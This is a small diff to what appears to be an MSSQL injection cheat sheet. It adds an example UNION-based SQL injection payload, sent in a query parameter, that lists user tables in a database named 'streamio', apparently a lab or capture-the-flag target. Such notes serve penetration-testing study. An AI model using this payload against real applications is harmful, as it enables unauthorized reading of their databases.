@@ -16,7 +16,13 @@ SELECT STRING_AGG(name,",") FROM master..sysobjects WHERE xtype = 'U'
 
 # WORK
 SELECT STRING_AGG(name,',') FROM master..sysobjects WHERE xtype = 'U'
+
+# Example
+
+q=*' union select 1,   (select STRING_AGG(concat(name,':',id),'|') FROM streamio..sysobjects WHERE xtype = 'u')   ,3,4,5,6; -- -
+
 ```
+
 
 ## List Columns
 
